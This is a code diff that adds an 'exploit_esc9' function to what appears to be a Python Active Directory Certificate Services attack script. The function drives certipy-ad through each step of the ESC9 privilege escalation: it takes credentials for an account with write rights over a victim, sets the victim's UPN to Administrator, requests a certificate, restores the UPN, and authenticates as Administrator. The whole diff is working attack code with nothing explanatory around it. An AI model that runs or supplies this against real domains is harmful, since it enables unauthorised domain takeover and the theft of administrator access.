@@ -224,3 +224,57 @@ def exploit_esc7(domain, dc_ip, username, password, ca_name):
 
     except subprocess.CalledProcessError as e:
         print(f"[!] ESC7 exploitation failed: {e}")
+
+def exploit_esc9(username, password, domain, dc_ip, ca_name, template_name):
+    print("\n[!] ESC9 has no specific command or parameter for certipy...")
+    print("[!] This exploitation requires a user with GenericAll/GenericWrite permissions")
+    
+    # Get the privileged user credentials
+    privileged_user = input("Who has GenericAll or GenericWrite on the victim account: ")
+    privileged_pass = input(f"Password of {privileged_user}: ")
+    
+    victim_user = username.split('@')[0] if '@' in username else username.split('\\')[-1]
+    
+    print("\n[*] Exploiting ESC9 vulnerability...")
+    
+    # Step 1: Update victim's UPN to Administrator
+    print("[*] Updating victim's UPN to Administrator...")
+    subprocess.run([
+        "certipy-ad", "account", "update",
+        "-u", f"{privileged_user}",
+        "-p", privileged_pass,
+        "-user", victim_user,
+        "-upn", f"Administrator@{domain}",
+        "-dc-ip", dc_ip
+    ], check=True)
+    
+    # Step 2: Request certificate as victim
+    print("[*] Requesting certificate as victim...")
+    subprocess.run([
+        "certipy-ad", "req",
+        "-u", f"{victim_user}@{domain}",
+        "-p", password,
+        "-ca", ca_name,
+        "-template", template_name,
+        "-dc-ip", dc_ip
+    ], check=True)
+    
+    # Step 3: Reset victim's UPN back to original
+    print("[*] Resetting victim's UPN back to original...")
+    subprocess.run([
+        "certipy-ad", "account", "update",
+        "-u", f"{privileged_user}",
+        "-p", privileged_pass,
+        "-user", victim_user,
+        "-upn", f"{victim_user}@{domain}",
+        "-dc-ip", dc_ip
+    ], check=True)
+    
+    # Step 4: Authenticate with the certificate
+    print("[*] Authenticating with the obtained certificate...")
+    subprocess.run([
+        "certipy-ad", "auth",
+        "-pfx", "administrator.pfx",
+        "-dc-ip", dc_ip,
+        "-domain", domain
+    ], check=True)
